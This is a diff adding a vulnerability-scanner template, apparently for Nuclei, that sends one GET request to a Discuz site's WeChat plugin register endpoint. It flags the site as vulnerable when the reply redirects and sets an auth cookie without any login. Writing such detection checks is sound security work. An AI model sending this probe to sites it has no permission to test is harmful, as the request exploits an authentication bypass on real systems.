@@ -1,0 +1,31 @@
+id: poc-local-cms-xray-discuz-wechat-plugins-unauth
+
+info:
+  name: poc-local-cms-xray-discuz-wechat-plugins-unauth
+  author: capiton
+  severity: medium
+  reference:
+    - https://gitee.com/ComsenzDiscuz/DiscuzX/issues/IPRUI
+  tags: discuz
+
+requests:
+  - raw:
+      - |
+        GET /plugin.php?id=wechat:wechat&ac=wxregister HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    redirects: false    
+    matchers:
+      - type: status
+        status:
+          - 302
+
+      - type: word
+        condition: and
+        part: header
+        words:
+          - "set-cookie"
+          - "auth"
+          - "location"
+          - "wsq.discuz.com"
